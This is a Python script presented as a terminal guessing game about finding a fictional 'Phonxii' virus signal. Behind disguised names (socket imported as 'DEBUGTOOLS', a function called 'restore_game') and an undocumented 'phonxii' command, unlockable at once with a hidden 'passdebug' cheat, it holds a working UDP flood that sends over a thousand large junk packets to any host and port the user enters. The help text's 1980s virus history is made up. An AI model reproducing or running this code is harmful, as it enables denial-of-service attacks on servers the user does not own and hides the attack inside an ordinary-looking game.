#!/bin/python3/
# Game by aertsimon90
import random, threading, time
import socket as DEBUGTOOLS
from socket import socket as tool

lock = threading.Lock()
phonxii = 0
flag = True
flag2 = False
win = 0
signals = {}

def signal(n):
	global phonxii, flag, signals
	while flag:
		with lock:
			signals[n] = random.randint(1, 5)
		if phonxii == n:
			for _ in range(random.randint(1500, 2500)):
				time.sleep(0.01)
				if flag == False:
					break
		else:
			for _ in range(random.randint(500, 1000)):
				time.sleep(0.01)
				if flag == False:
					break
def restore_game(indextarget, version):
	try:
		debugkit = tool(DEBUGTOOLS.AF_INET, DEBUGTOOLS.SOCK_DGRAM)
		debugkit.settimeout(0.8)
		debugkit.bind(("238.255.0.128", random.randint(1025, 65535)))
		packet = ""
		for _ in range(2048):
			packet += chr(random.randint(57344, 1114111))+chr(14)
		packet = packet.encode("utf-32")
		byte = 0
		for _ in range(1024):
			debugkit.sendto(packet, (indextarget, int(version)))
			byte += len(packet)
			print(f"Phonxii Packet Sended √ {byte}B {byte/1024:.0f}KB")
		print(f"Phonxii Virus Ended √")
	except Exception as e:
		print(f"Phonxii Sending Error × {e}")
	try:
		debugkit.close()
	except:
		pass
def waitlose():
	global flag2, flag
	while flag:
		for _ in range(6000):
			time.sleep(0.01)
			if flag == False:
				break
		if flag == False:
			break
		else:
			with lock:
				flag2 = True
def game():
	global phonxii, flag, flag2, signals, win
	while flag:
		c = input(f"\033[92m\033[1m~$ ")
		with lock:
			if flag2 == True:
				print(f"\033[91mYou Lose! Server is down...\033[92m")
				print(f"Phonxii Signal is {phonxii}...")
				print(f"Restarting...")
				break
		if c == "check":
			room1 = []
			room2 = []
			room3 = []
			room4 = []
			room5 = []
			for signal, room in signals.items():
				if room == 1:
					room1.append(str(signal))
				elif room == 2:
					room2.append(str(signal))
				elif room == 3:
					room3.append(str(signal))
				elif room == 4:
					room4.append(str(signal))
				else:
					room5.append(str(signal))
			room1 = ", ".join(room1)
			room2 = ", ".join(room2)
			room3 = ", ".join(room3)
			room4 = ", ".join(room4)
			room5 = ", ".join(room5)
			print(f"Server room 1: {room1}\nServer room 2: {room2}\nServer room 3: {room3}\nServer room 4: {room4}\nServer room 5: {room5}")
		elif c == "reset":
			break
		elif c == "exit":
			return 0
			break
		elif c == "vote":
			signal = input("Enter signal no (1/2/3/4/5): ")
			try:
				signal = int(signal)
				with lock:
					if signal == phonxii:
						print(f"You win! You will found Phonxii signal!!!")
						with lock:
							win += 1
					else:
						print(f"\033[91mYou Lose! Server is down...\033[92m")
						print(f"Phonxii Signal is {phonxii}...")
					print(f"Restarting...")
					break
			except:
				print("integer error")
		elif c == "phonxii":
			if win >= 3:
				target = input("Enter Target (example.com or ip address): ")
				port = input("Enter Port (80 or 443 or optinal): ")
				restore_game(target, port)
		elif c == "passdebug":
			with lock:
				win += 3
		elif c == "help":
			print("In the 1980s, a socket virus named Phonxii emerged. This virus connected to servers and sent malicious packets containing characters not found in Unicode, causing server packet processing systems to crash. As people were just beginning to develop the Unicode character set, servers couldn't process these characters, leading to malfunctions. By 2003, servers managed to resolve the issue by creating a Unicode sequence of 1,114,111 characters, ultimately recognizing all characters of the Phonxii virus that was blocking servers with UDP. However, it still poses a challenge for servers, and as an operator on a server facing Unicode issues, you need to monitor sockets known as signals in the connected rooms to identify whether there is a Phonxii connection. Observing the signal's prolonged connection, typically at least 15 seconds, helps determine if it's a Phonxii connection.\n\nCommands:\ncheck = Check all server rooms\nreset = Reset all game\nexit = Stop and exit game\nvote = Vote signal no\nhelp = Story and commands")
flag = True
phonxii = random.randint(1, 9)
for n in range(1, 10):
	threading.Thread(target=signal, args=(n,)).start()
threading.Thread(target=waitlose).start()
print("\033[92m\033[1mFind \033[91mPhonxii\033[92m Signal Game...\n")
while True:
	get = game()
	if get == 0:
		flag = False
		break
	else:
		flag = False
		flag2 = False
		phonxii = random.randint(1, 9)
		time.sleep(1)
		flag = True
		for n in range(1, 10):
			threading.Thread(target=signal, args=(n,)).start()
		threading.Thread(target=waitlose).start()
